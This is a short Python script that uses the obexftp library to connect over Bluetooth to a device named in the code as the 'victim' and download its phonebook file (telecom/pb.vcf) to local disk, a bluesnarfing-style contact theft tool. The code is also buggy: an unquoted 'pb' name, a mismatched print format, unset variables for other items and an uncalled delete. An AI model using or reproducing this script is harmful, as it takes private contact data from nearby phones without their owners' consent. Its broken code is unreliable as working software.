#!/usr/bin/env python

import obexftp

def grab_obex(victim, item):
    dev = victim
    obex = obexftp.client(obexftp.BLUETOOTH)
    channel = obexftp.browsebt(dev,0)
    print "Connecting to %d on channel %d" % dev, channel
    print obex.connect(dev, channel)
    
    if item == pb:
        item_spec = "telecom/pb.vcf"
        save_file = 'pb.vcf'
    
    data = obex.get(item_spec)
    file = open(save_file, 'wb')
    file.write(data)
    print obex.disconnect()
    obex.delete